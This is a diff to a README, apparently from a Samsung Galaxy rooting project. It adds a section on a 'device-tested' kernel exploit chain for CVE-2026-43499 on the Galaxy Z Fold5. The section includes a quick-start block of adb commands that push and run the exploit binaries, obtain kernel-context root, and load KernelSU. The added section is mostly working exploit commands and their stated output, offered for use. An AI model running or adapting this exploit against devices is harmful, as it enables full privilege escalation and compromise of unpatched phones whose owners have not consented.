@@ -23,9 +23,33 @@ It intentionally does not contain Android application source code.
 | `dm3q-S9180ZHS8FZF5` | Galaxy S23 Ultra `SM-S9180` | `5.15.189` | Test in progress |
 | `dm2q-S916BXXSAFZG1` | Galaxy S23+ `SM-S916B` | `5.15.189` | Experimental: hardware root from ADB shell; not in app feed |
 | `dm2q-S916NKSS8FZG1` | Galaxy S23+ `SM-S916N` | `5.15.189` | Experimental: hardware root from ADB shell; not in app feed |
-| `f946b-F946BXXS7GZE5` | Galaxy Z Fold 5 `SM-F946B` | `5.15.189` | Porting in progress |
+| `f946b-F946BXXS7GZE5` | Galaxy Z Fold 5 `SM-F946B` | `5.15.189` | **Device-tested: full root + KernelSU from ADB shell** |
 
-The S916B FZG1 profile is shell-only today. Its exact tracefs route works from `adb shell`, but direct app-domain execution is not supported. Root My Galaxy would need to delegate the native runner through an authorized shell bridge such as Shizuku. See [`artifacts/dm2q-S916BXXSAFZG1/README.md`](artifacts/dm2q-S916BXXSAFZG1/README.md).
+The S916B FZG1 and F946B F946BXXS7GZE5 profiles are shell-only. Their exact tracefs route works from `adb shell` (`u:r:shell:s0`), but direct app-domain execution is not supported. Root My Galaxy would need to delegate the native runner through an authorized shell bridge such as Shizuku. See [`artifacts/dm2q-S916BXXSAFZG1/README.md`](artifacts/dm2q-S916BXXSAFZG1/README.md).
+
+### Galaxy Z Fold5 (SM-F946B, F946BXXS7GZE5) — Confirmed Working
+
+This fork contains the **device-tested** Fold5 exploit chain:
+
+- **Kernel**: `5.15.189-android13-8-33404244-abF946BXXS7GZE5`
+- **Engine**: MCAST/tracefs/shaped-reclaim (PR #223)
+- **Result**: `uid=0(root) gid=0(root) context=u:r:kernel:s0`, KernelSU v3.2.5 loaded, no panic
+- **All 66 offsets verified** against recovered `vmlinux.elf` + `vmlinux.btf` (see [`docs/f946b-offset-memory.md`](docs/f946b-offset-memory.md))
+
+Quick start (ADB shell, one attempt per boot):
+
+```cmd
+adb push artifacts/f946b-F946BXXS7GZE5/cve-2026-43499-app.so /data/local/tmp/f946b.so
+adb push artifacts/f946b-F946BXXS7GZE5/cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
+adb push kernelsu/ksud-f946b-F946BXXS7GZE5-kdp /data/local/tmp/ksud-f946b-kdp
+adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-f946b-kdp"
+adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 /data/local/tmp/cve-2026-43499-root --run-payload /data/local/tmp/f946b.so /data/local/tmp/cve-2026-43499-root /data/local/tmp/f946b.log"
+adb shell "/data/local/tmp/cve-2026-43499-root -c 'id; getenforce'"
+adb shell "/data/local/tmp/cve-2026-43499-root -c 'cp /data/local/tmp/ksud-f946b-kdp /data/local/tmp/ksud-s25u-kdp; chmod 755 /data/local/tmp/ksud-s25u-kdp'"
+adb shell "/data/local/tmp/cve-2026-43499-root --late-load"
+```
+
+Both root and KernelSU are volatile — a reboot removes them.
 
 Schema version 3 keeps each exploit and KernelSU artifact once. Its flat
 `models` and `kernelVersions` arrays define runtime compatibility. See
